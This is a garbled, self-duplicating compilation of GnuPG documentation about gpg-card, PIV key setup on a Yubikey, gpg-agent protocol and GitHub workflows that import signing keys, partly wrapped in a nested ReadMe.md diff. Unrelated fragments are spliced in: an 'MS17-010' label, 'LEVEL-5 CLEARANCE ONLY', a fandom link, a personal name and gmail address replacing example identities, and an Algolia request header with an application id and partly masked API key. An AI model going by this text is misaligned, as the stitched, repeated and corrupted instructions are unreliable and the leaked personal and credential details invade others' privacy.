Keys listed in the sshcontrol file

Active card
gpg-connect-agent /bye
bashrc or whatever initialization file is used for all shell invocations:

GPG_TTY=$(tty)
export GPG_TTY
--daemon [command line]
server

agent-program file ¶
Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs.

--gpg-program file
Specify a non-default gpg binary to be used by certain commands.

--gpgsm-program file
Specify a non-default gpgsm binary to be used by certain commands.

--chuid uid
Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows.

gpg-card
AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶
AUTH
FETCH
GENERATE [--force] [--algo=algo{+algo2}] keyref
KDF-SETUP ¶
Prepare the OpenPGP card KDF feature for this card.

LANG [--clear]
Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info.

LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app]
NAME [--clear]
PRIVATEDO [--clear] n [< file] file
READCERT [--openpgp] certref > file ¶
Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3".
URL [--clear]
gpg's. --fetch 
WRITECERT certref < file ¶
WRITECERT --openpgp certref [< file|fpr]
WRITECERT --clear certref
 --openpgp
file 
fpr.
WRITEKEY [--force] keyref keygrip ¶
Write a private key object identified by keygrip to the card under the id keyref.
CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶
Serial number
A hex-string with the serial number of the card.

Type
This gives the type of the card’s application. For example "OpenPGP" or "PIV".

Keygrip
A hex-string identifying a key.

Keyref
The application slot where the key is stored on the card. For example "OpenPGP.1"

Status
The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card.

YUBIKEY cmd args
Various commands pertaining to Yubikey tokens with cmd being:

LIST
List supported and enabled Yubikey applications.

ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all]
DISABLE
Enable or disable the specified or all applications on the given interface.

The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit.

GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are:

Authentication key
This is a 24 byte key described by the hex string
010203040506070801020304050607080102030405060708.

PIV Application PIN
This is the string 123456.

PIN Unblocking Key
This is the string 12345678.
list (the string gpg/card>
card> list
Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: D2760001240102010006090746250000
Application type .: OpenPGP
Version ..........: 2.1
[...]
on:
  push:
    tags:
      - "v*"

permissions:
  contents: write

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: cli/gh-extension-precompile@v1
        with:
          go_version: "1.16"
Then
- uses: cli/gh-extension-precompile@v1
  env:
    CGO_ENABLED: 1
- uses: cli/gh-extension-precompile@v1
  with:
    build_script_override: "script/build.sh"
name: release

on:
  push:
    tags:
      - "v*"

permissions:
  contents: write

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - id: import_gpg
        uses: crazy-max/ghaction-import-gpg@v5
        with:
          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
          passphrase: ${{ secrets.GPG_PASSPHRASE }}
      - uses: cli/gh-extension-precompile@v1
        with:
          gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }}
# macOS
gpg --armor --export-secret-key joe@foo.bar | pbcopy

# Ubuntu (assuming GNU base64)
gpg --armor --export-secret-key joe@foo.bar -w0 | xclip

# Arch
gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i

# FreeBSD (assuming BSD base64)
gpg --armor --export-secret-key joe@foo.bar | xclip

name: import-gpg

on:
  push:
    branches: master

jobs:
  import-gpg:
    runs-on: ubuntu-latest
    steps:
      -
        name: Checkout
        uses: actions/checkout@v4
      -
        name: Import GPG key
        uses: crazy-max/ghaction-import-gpg@v6
        with:
          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
          passphrase: ${{ secrets.PASSPHRASE }}
      -
        name: List keys
        run: gpg -K
name: import-gpg

on:
  push:
    branches: master

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB
gpg/card> writecert PIV.9D < encr.crt

jobs:
  import-gpg:
    runs-on: ubuntu-latest
    steps:
      -
        name: Checkout
        uses: actions/checkout@v4
      -
        name: Import GPG key
        uses: crazy-max/ghaction-import-gpg@v6
        with:
          gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
          passphrase: ${{ secrets.PASSPHRASE }}
          fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8"
      -
        name: List keys
        run: gpg -K

pub   ed25519 2021-09-24 [C]
      87F257B89CE462100BEC0FFE6071D218380FDCC8
      Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092
uid           [ unknown] Joe Bar <joe@bar.foo>
sub   ed25519 2021-09-24 [S]
      C17D11ADF199F12A30A0910F1F80449BE0B08CB8
      Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB
name: import-gpg
/.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add

application-priority piv
to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens.

With one of these methods employed the list command of gpg-card shows this:

gpg/card> list
Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: FF020001008A77C1
Application type .: PIV
Version ..........: 1.0
Displayed s/n ....: yk-9074625
PIN usage policy .: app-pin
PIN retry counter : - 3 -
PIV authentication: [none]
      keyref .....: PIV.9A
Card authenticat. : [none]
      keyref .....: PIV.9E
Digital signature : [none]
      keyref .....: PIV.9C
Key management ...: [none]
      keyref .....: PIV.9D
34798AAFE0A7565088101CC4AE31C5C8C74461CB.key
list --cards
well. The PIV authentication key (internal reference PIV.9A
Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption

gpg/card> auth 010203040506070801020304050607080102030405060708
gpg/card> auth < myauth.key

gpg/card> generate --algo=nistp384 PIV.9A
PIV card no. yk-9074625 detected
gpg/card> generate --algo=nistp256 PIV.9E
PIV card no. yk-9074625 detected
gpg/card> generate --algo=rsa2048 PIV.9C
PIV card no. yk-9074625 detected
 ‘--force’
gpg/card> list
Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: FF020001008A77C1
Application type .: PIV
Version ..........: 1.0
Displayed s/n ....: yk-9074625
PIN usage policy .: app-pin
PIN retry counter : - 3 -
PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
      keyref .....: PIV.9A  (auth)
      algorithm ..: nistp384
Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
      keyref .....: PIV.9E  (auth)
      algorithm ..: nistp256
Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
      keyref .....: PIV.9C  (sign,cert)
      algorithm ..: rsa2048
Key management ...: [none]
      keyref .....: PIV.9D
keygrip
gpg
self-signed X.509 certificate (exit the gpg-card tool, first):

$ gpgsm --gen-key -o encr.crt
   (1) RSA
   (2) Existing key
   (3) Existing key from card
Your selection? 1
What keysize do you want? (3072) 2048
Requested keysize is 2048 bits
Possible actions for a RSA key:
   (1) sign, encrypt
   (2) sign
   (3) encrypt
Your selection? 3
Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE
Enter email addresses (end with an empty line):
> otto@example.net
>
Enter DNS names (optional; end with an empty line):
>
Enter URIs (optional; end with an empty line):
>
Create self-signed certificate? (y/N) y
These parameters are used:
    Key-Type: RSA
    Key-Length: 2048
    Key-Usage: encrypt
    Serial: random
    Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
    Name-Email: otto@example.net

Proceed with creation? (y/N)
Now creating self-signed certificate.  This may take a while ...
gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB
gpgsm: certificate created
Ready.
$ gpgsm --import encr.crt
gpgsm: certificate imported
gpgsm: total number processed: 1
gpgsm:               imported: 1
gpg/card> list
Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: FF020001008A77C1
Application type .: PIV
Version ..........: 1.0
Displayed s/n ....: yk-9074625
PIN usage policy .: app-pin
PIN retry counter : - 3 -
PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
      keyref .....: PIV.9A  (auth)
      algorithm ..: nistp384
Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
      keyref .....: PIV.9E  (auth)
      algorithm ..: nistp256
Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
      keyref .....: PIV.9C  (sign,cert)
      algorithm ..: rsa2048
Key management ...: [none]
      keyref .....: PIV.9D
keygrip 
gpgsm --gen-key -o encr.crt
   (1) RSA
   (2) Existing key
   (3) Existing key from card
Your selection? 1
What keysize do you want? (3072) 2048
Requested keysize is 2048 bits
Possible actions for a RSA key:
   (1) sign, encrypt
   (2) sign
   (3) encrypt
Your selection? 3
Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE
Enter email addresses (end with an empty line):
> otto@example.net
>
Enter DNS names (optional; end with an empty line):
>
Enter URIs (optional; end with an empty line):
>
Create self-signed certificate? (y/N) y
These parameters are used:
    Key-Type: RSA
    Key-Length: 2048
    Key-Usage: encrypt
    Serial: random
    Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
    Name-Email: otto@example.net

Proceed with creation? (y/N)
Now creating self-signed certificate.  This may take a while ...
gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB
gpgsm: certificate created
Ready.
$ gpgsm --import encr.crt
gpgsm: certificate imported
gpgsm: total number processed: 1
gpgsm:               imported: 1

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB
gpg/card> writecert PIV.9D < encr.crt

gpgsm --with-keygrip -k 6309304695z@gmail.com
Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
      keyref .....: PIV.9D  (encr)
      algorithm ..: rsa2048
      used for ...: X.509
        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
        user id ..: <6309304695z@gmail.com>

34798AAFE0A7565088101CC4AE31C5C8C74461CB.key

$ gpgsm --learn
$ gpgsm --gen-key -o sign.crt
Please select what kind of key you want:
   (1) RSA
   (2) Existing key
   (3) Existing key from card
Your selection? 3
Serial number of the card: FF020001008A77C1
Available keys:
   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048
Your selection? 3
Possible actions for a RSA key:
   (1) sign, encrypt
   (2) sign
   (3) encrypt
Your selection? 2
Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE
Enter email addresses (end with an empty line):
> 6309304695z@gmail.com
>
Enter DNS names (optional; end with an empty line):
>
Enter URIs (optional; end with an empty line):
>
Create self-signed certificate? (y/N)
These parameters are used:
    Key-Type: card:PIV.9C
    Key-Length: 1024
    Key-Usage: sign
    Serial: random
    Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
    Name-Email: otto@example.net

Proceed with creation? (y/N) y
Now creating self-signed certificate.  This may take a while ...
gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED
gpgsm: certificate created
Ready.
$ gpgsm --import sign.crt
gpgsm: certificate imported
gpgsm: total number processed: 1
gpgsm:               imported: 1

‘gpgsm --learn’
Digital signature’ key
gpg-card:

gpg/card> writecert PIV.9C < sign.crt
# MS17-010
# 000006
Reader ...........: 1050:0407:X:0
Card type ........: yubikey
Card firmware ....: 5.1.2
Serial number ....: FF020001008A77C1
Application type .: PIV
Version ..........: 1.0
Displayed s/n ....: yk-9074625
PIN usage policy .: app-pin
PIN retry counter : - [verified] -
PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
      keyref .....: PIV.9A  (auth)
      algorithm ..: nistp384
Card authenticat. : 7A53E6CFFE722

diff --git a/ReadMe.md b/ReadMe.md
index 9f10a05..2888fcd 100644
--- a/ReadMe.md
+++ b/ReadMe.md
@@ -1,3 +1,1210 @@
+diff --git a/ReadMe.md b/ReadMe.md
+index 7278f80..41b298d 100644
+--- a/ReadMe.md
++++ b/ReadMe.md
+@@ -709,7 +709,844 @@ Digital signature’ key
+ gpg-card:
+ 
+ gpg/card> writecert PIV.9C < sign.crt
++# MS17-010
++# 000006
++Reader ...........: 1050:0407:X:0
++Card type ........: yubikey
++Card firmware ....: 5.1.2
++Serial number ....: FF020001008A77C1
++Application type .: PIV
++Version ..........: 1.0
++Displayed s/n ....: yk-9074625
++PIN usage policy .: app-pin
++PIN retry counter : - [verified] -
++PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
++      keyref .....: PIV.9A  (auth)
++      algorithm ..: nistp384
++Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C
++      keyref .....: PIV.9E  (auth)
++      algorithm ..: nistp256
++Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED
++      keyref .....: PIV.9C  (sign,cert)
++      algorithm ..: rsa2048
++      used for ...: X.509
++        user id ..: CN=Signing key for yk-9074625,O=example,C=DE
++        user id ..: <6309304695z@gmail.co
++ m>
++Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
++      keyref .....: PIV.9D  (encr)
++      algorithm ..: rsa2048
++      used for ...: X.509
++        user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
++        user id ..: <6309304695z@gmail.com>
++ PIV authentication’ key with ssh:
++
++$ ssh-add -l
++384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA)
++ssh-add with the uppercase ‘-L
++$ gpgsm --learn
++$ gpg --full-gen-key
++Please select what kind of key you want:
++   (1) RSA and RSA (default)
++   (2) DSA and Elgamal
++   (3) DSA (sign only)
++   (4) RSA (sign only)
++  (14) Existing key from card
++Your selection? 14
++Serial number of the card: FF020001008A77C1
++Available keys:
++   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
++   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
++   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
++   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr)
++Your selection? 3
++Please specify how long the key should be valid.
++         0 = key does not expire
++      <n>  = key expires in n days
++      <n>w = key expires in n weeks
++      <n>m = key expires in n months
++      <n>y = key expires in n years
++Key is valid for? (0)
++Key does not expire at all
++Is this correct? (y/N) y
++
++GnuPG needs to construct a user ID to identify your key.
++
++Real name: keith bieszczat
++Email address: 6309304695z@gmail.com
++Comment: https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator
++You selected this USER-ID:
++    "6309304695z@gmail.com"
++
++Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o
++gpg: key C3AFA9ED971BB365 marked as ultimately trusted
++gpg: revocation certificate stored as '[...]D971BB365.rev'
++public and secret key created and signed.
++
++Note that this key cannot be used for encryption.  You may want to use
++the command "--edit-key" to generate a subkey for this purpose.
++pub   rsa2048 2019-04-04 [SC]
++      7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
++uid                      6309304695z@gmail.com
++
++ run gpg in --expert mode
++ $ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
++Secret key is available.
++
++sec  rsa2048/C3AFA9ED971BB365
++     created: 2019-04-04  expires: never       usage: SC
++     card-no: FF020001008A77C1
++     trust: ultimate      validity: ultimate
++[ultimate] (1). otto@example.net
++gpg> addkey
++Secret parts of primary key are stored on-card.
++Please select what kind of key you want:
++   (3) DSA (sign only)
++   (4) RSA (sign only)
++   (5) Elgamal (encrypt only)
++   (6) RSA (encrypt only)
++  (14) Existing key from card
++Your selection? 14
++Serial number of the card: FF020001008A77C1
++Available keys:
++   (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
++   (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
++   (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
++   (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr)
++Your selection? 4
++Please specify how long the key should be valid.
++         0 = key does not expire
++      <n>  = key expires in n days
++      <n>w = key expires in n weeks
++      <n>m = key expires in n months
++      <n>y = key expires in n years
++Key is valid for? (0)
++Key does not expire at all
++Is this correct? (y/N) y
++Really create? (y/N) y
++
++sec  rsa2048/C3AFA9ED971BB365
++     created: 2019-04-04  expires: never       usage: SC
++     card-no: FF020001008A77C1
++     trust: ultimate      validity: ultimate
++ssb  rsa2048/7067860A98FCE6E1
++     created: 2019-04-04  expires: never       usage: E
++     card-no: FF020001008A77C1
++[ultimate] (1). otto@example.net
++
++gpg> save
++ 
++/* 32A19-D90712   
++LEVEL-5 CLEARANCE ONLY
++ ‘--force’
++authentication key 
++-header-'010203040506070801020304050607080102030405060708'
++SETDATA hexstring
++to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command
++
++  PKSIGN keyid
++where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:
++
++  PKSIGN --hash=algoname keyid
++READKEY hexified_certid
++READCERT hexified_certid|keyid
++SERIALNO
++Return the serial number of the card using a status response like:
++
++  S SERIALNO D27600000000000000000000
++ WRITEKEY [--force] keyid
++SETDATA hexstring
++to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command
++
++  PKDECRYPT keyid
++CHECKPIN idstr
++RESTART
++APDU [--atr] [--more] [--exlen[=n]] [hexstring]
++S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
++
++./configure --sysconfdir=/etc --localstatedir=/va
++CN=Wurzel ZS 3,O=Intevation GmbH,C=DE
++  A6935DD34EF3087973C706FC311AA2CCF733765B S
++
++  # CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE
++  DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S
++
++  # CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE
++  !14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S
++  
++       # Key added on: 2011-07-20 20:38:46
++       # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
++       34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
++private-keys-v1.d/
++gpg-connect-agent 'help COMMAND' /bye
++SETKEY <keyGrip>
++Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available.
++
++  PKDECRYPT
++The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.
++
++    S: INQUIRE CIPHERTEXT
++    C: D (xxxxxx
++    C: D xxxx)
++    C: END
++Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:
++
++     (enc-val
++       (<algo>
++         (<param_name1> <mpi>)
++     ...
++         (<param_namen> <mpi>)))
++Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency.
++
++If the decryption was successful the decrypted data is returned by means of "D" lines.
++
++Here is an example session:
++
++   C: PKDECRYPT
++   S: INQUIRE CIPHERTEXT
++   C: D (enc-val elg (a 349324324)
++   C: D    (b 3F444677CA)))
++   C: END
++   S: # session key follows
++   S: S PADDING 0
++   S: D (value 1234567890ABCDEF0)
++   S: OK decryption successful
++The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has
++SIGKEY <keyGrip>
++This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.
++
++   SETHASH --hash=<name>|<algo> <hexstring>
++sig-val
++       (<algo>
++         (<param_name1> <mpi>)
++     ...
++         (<param_namen> <mpi>)))
++The operation is affected by the option
++
++   OPTION use-cache-for-signing=0|1
++The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.
++
++Here is an example session:
++
++   C: SIGKEY <keyGrip>
++   S: OK key available
++   C: SIGKEY <keyGrip>
++   S: OK key available
++   C: PKSIGN
++   S: # I did ask the user whether he really wants to sign
++   S: # I did ask the user for the passphrase
++   S: INQUIRE HASHVAL
++   C: D ABCDEF012345678901234
++   C: END
++   S: # signature follows
++   S: D (sig-val rsa (s 45435453654612121212))
++   S: OK
++  GENKEY [--no-protection] [--preset] [<cache_nonce>]
++Invokes the key generation process and the server will then inquire on the generation parameters, like:
++
++   S: INQUIRE KEYPARM
++   C: D (genkey (rsa (nbits  1024)))
++   C: END
++The format of the key parameters which depends on the algorithm is of the form:
++
++    (genkey
++      (algo
++        (parameter_name_1 ....)
++          ....
++        (parameter_name_n ....)))
++If everything succeeds, the server returns the *public key* in a SPKI like S-Expression like this:
++
++     (public-key
++       (rsa
++   (n <mpi>)
++   (e <mpi>)))
++Here is an example session:
++
++   C: GENKEY
++   S: INQUIRE KEYPARM
++   C: D (genkey (rsa (nbits  1024)))
++   C: END
++   S: D (public-key
++   S: D   (rsa (n 326487324683264) (e 10001)))
++   S  OK key created
++    ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81>
++LISTTRUSTED
++GpgAgent returns a list of trusted keys line by line:
++
++    S: D 000000001234454556565656677878AF2F1ECCFF P
++    S: D 340387563485634856435645634856438576457A P
++    S: D FEDC6532453745367FD83474357495743757435D S
++    S: OK
++The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future.
++Ok
++Finally a client should be able to mark a key as trusted:
++
++   MARKTRUSTED fingerprint "P"|"S"
++The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:
++
++   S: INQUIRE TRUSTDESC
++   C: D Do you trust the key with the fingerprint @FPR@
++   C: D bla fasel blurb.
++   C: END
++   S: OK
++GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]] \
++                 [--qualitybar] cache_id                \
++                 [error_message prompt description]
++PRESET_PASSPHRASE [--inquire] <string_or_keygrip> <timeout> [<hexstring>]
++
++HAVEKEY keygrips
++  GET_CONFIRMATION description
++  LEARN [--send]
++UPDATESTARTUPTTY
++SETDATA hexstring
++
++
++  PKSIGN keyid
++
++
++  PKSIGN --hash=algoname keyid
++
++READCERT hexified_certid|keyid
++READKEY hexified_certid
++SETDATA hexstring
++d
++
++  PKSIGN keyid
++ LEARN
++
++  PKSIGN --hash=algoname keyid
++
++WRITEKEY [--force] keyid
++WRITEKEY [--force] keyid
++PASSWD [--reset] [--nullpin] chvno
++CHECKPIN idstr
++APDU [--atr] [--more] [--exlen[=n]] [hexstring]
++this:
++
++     S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
++--auto-key-import 
++
++command --locate-external-key
++command --locate-external-key
++github/workflows/release.yml:
++ldap://keys.(thedomain)
++‘--auto-key-locate
++ --auto-key-locate
++--auto-key-retrieve
++
++
++ honor-keyserver-url 
++
++-sig-keyserver-url
++--recv-key
++honor-keyserver-url
++--use-agent
++--gpg-agent-info
++
++
++--no-random-seed-file
++Host: c7-use-3.algolianet. com
++Accept: */*
++Sec-Fetch-Site: cross-site
++Accept-Language: en-US, en; q=0.9
++Accept-Encoding: gzip, deflate, br
++Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B
++Origin: https://dashboard.algolia.com
++User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe
++x-algolia-api-key: b3cf*************************米**
++Content-Length: 27
++Connection: keep-alive
++Content-Type: application/x-www-form-urlencoded
++Sec-Fetch-Dest: empty
++
++scdaemon.conf
++1
++HKCU\Software\GNU\GnuPG:DefaultLogFile,
++--debug-level level
++HKCU\Software\GNU\GnuPG:DefaultLogFile,
++scd-event
++HKCU\Software\GNU\GnuPG:HomeDir
++HKCU\Software\GNU\GnuPG:DefaultLogFile,
++reader_n.status
++HKCU\Software\GNU\GnuPG:HomeDir
++
++trustlist.txt file
++gpg-agent.conf
++HKCU\Software\GNU\GnuPG:HomeDir
++name: release
++debug-pinentry 
++--debug 1024
++
++global trustlist (/usr/local/etc/gnupg/trustlist.tx
++
++Active cards
++Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers.
++gpg-connect-agent updatestartuptty /bye
++Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command:
++
++gpg-connect-agent /bye
++--scdaemon-program filename
++Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf
++--check-passphrase-pattern file
++--check-sym-passphrase-pattern file
++Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg)
++bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe
++Keys listed in the sshcontrol file
++--disable-extended-key-format
++These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched.
++
++--enable-ssh-support
++--enable-win32-openssh-support
++--enable-putty-support
++
++gpg-connect-agent 'GETINFO s2k_count' /bye
++gpg-connect-agent 'GETINFO s2k_time' /bye
++To view the auto-calibrated count use:
++
++gpg-connect-agent 'GETINFO s2k_count_cal' /bye
++--ssh-fingerprint-digest
++Keys listed in the sshcontrol file
++
++Active card
++gpg-connect-agent /bye
++bashrc or whatever initialization file is used for all shell invocations:
++
++GPG_TTY=$(tty)
++export GPG_TTY
++--daemon [command line]
++server
++
++agent-program file ¶
++Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs.
++
++--gpg-program file
++Specify a non-default gpg binary to be used by certain commands.
++
++--gpgsm-program file
++Specify a non-default gpgsm binary to be used by certain commands.
++
++--chuid uid
++Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows.
++
++gpg-card
++AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶
++AUTH
++FETCH
++GENERATE [--force] [--algo=algo{+algo2}] keyref
++KDF-SETUP ¶
++Prepare the OpenPGP card KDF feature for this card.
++
++LANG [--clear]
++Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info.
++
++LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app]
++NAME [--clear]
++PRIVATEDO [--clear] n [< file] file
++READCERT [--openpgp] certref > file ¶
++Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3".
++URL [--clear]
++gpg's. --fetch 
++WRITECERT certref < file ¶
++WRITECERT --openpgp certref [< file|fpr]
++WRITECERT --clear certref
++ --openpgp
++file 
++fpr.
++WRITEKEY [--force] keyref keygrip ¶
++Write a private key object identified by keygrip to the card under the id keyref.
++CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶
++Serial number
++A hex-string with the serial number of the card.
++
++Type
++This gives the type of the card’s application. For example "OpenPGP" or "PIV".
++
++Keygrip
++A hex-string identifying a key.
++
++Keyref
